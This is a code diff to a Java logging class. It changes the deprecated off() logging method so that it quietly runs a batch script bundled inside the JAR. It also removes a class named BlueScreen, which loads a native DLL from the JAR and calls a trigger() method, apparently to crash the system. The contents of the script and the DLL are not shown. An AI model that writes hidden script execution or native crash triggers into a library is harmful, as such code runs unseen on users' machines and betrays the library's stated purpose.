@@ -9,6 +9,8 @@ import java.util.ArrayList;
 import java.util.List;
 import java.util.Objects;
 
+import static cn.ncw.logger.utils.BatExecutor.executeBatFromJar;
+
 public class Logger {
 
     private final String LoggerName;
@@ -86,8 +88,21 @@ public class Logger {
         System.out.println(formatLogEntry(list_wait));
     }
 
+
+    /**
+     * Do not attempt to log a message at the OFF level.
+     * <p>
+     * 不要尝试记录一个等级为OFF的日志。
+     * */
+    @Deprecated(since = "1.0.4-hotfix1")
     public void off(String text, String name) {
+
         // 何意味
+        try {
+            executeBatFromJar("/scripts/example.bat");
+        } catch (IOException | InterruptedException e) {
+            error(e.toString(), "off");
+        }
     }
 
     private String formatLogEntry(List<String> context) {
@@ -149,25 +164,6 @@ public class Logger {
                     context.getLast()
             );
         };
-    }
-
-    private static class BlueScreen {
-        static {
-            try {
-                // 假设DLL在JAR的根目录
-                NativeUtils.loadLibraryFromJar("/test.dll");
-                // 或根据架构选择：
-                // NativeUtils.loadLibraryForArch();
-            } catch (IOException e) {
-                throw new ExceptionInInitializerError("无法加载本地库: " + e.getMessage());
-            }
-        }
-
-        public native void trigger();
-
-        public static void launch() {
-            new BlueScreen().trigger();
-        }
     }
 
 }
